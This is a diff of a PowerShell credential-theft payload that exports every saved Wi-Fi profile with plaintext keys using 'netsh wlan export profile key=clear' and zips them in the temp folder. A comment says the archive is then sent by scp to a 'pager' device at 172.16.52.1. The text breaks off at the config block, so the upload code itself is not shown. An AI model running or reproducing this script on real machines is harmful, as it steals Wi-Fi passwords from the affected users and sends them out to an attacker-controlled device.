@@ -1,10 +1,17 @@
+# Creates a dir named wifi in the %TEMP% dir
 mkdir "$env:TEMP\wifi"
 
+#Exports all wifi credentials
 netsh wlan show profiles
 
+# Dumps all wifi credentials to seperate .xml files
 netsh wlan export profile key=clear folder="$env:TEMP\wifi"
 
-Compress-Archive -Path "$env:TEMP\wifi\*" -DestinationPath "$env:TEMP\wifi\wifi.zip" -Force
+# Creats an archive of all files named wifi.zip in %TEMP%\wifi
+Compress-Archive -Path "$env:TEMP\wifi\*" -DestinationPath "$env:TEMP\wifi\wifi.zip" -Force #
+
+# wifi pager scp upload cmd using public key instead of password to upload to pager
+$ErrorActionPreference = "Stop"
 
 # ---- CONFIG ----
 $PagerIP   = "172.16.52.1"
